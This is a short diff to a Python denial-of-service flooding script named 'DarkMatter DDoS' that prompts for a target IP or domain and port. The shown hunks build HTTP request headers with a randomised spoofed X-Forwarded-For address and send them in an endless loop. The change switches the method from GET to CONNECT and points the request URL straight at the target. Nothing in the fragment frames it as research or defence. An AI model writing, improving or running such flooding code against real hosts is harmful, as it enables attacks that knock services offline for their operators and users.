@@ -55,7 +55,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "GET " + url + " HTTP/2.0\r\nHost: " + ip + "\r\n"
+  get_host = "CONNECT " + url + " HTTP/2.0\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
@@ -72,7 +72,7 @@ def attack():
 print("Bienvenido a DarkMatter DDoS\n")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
-url = f"http://50.7.198.146/{str(ip)}"
+url = f"http://{str(ip)}"
 print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
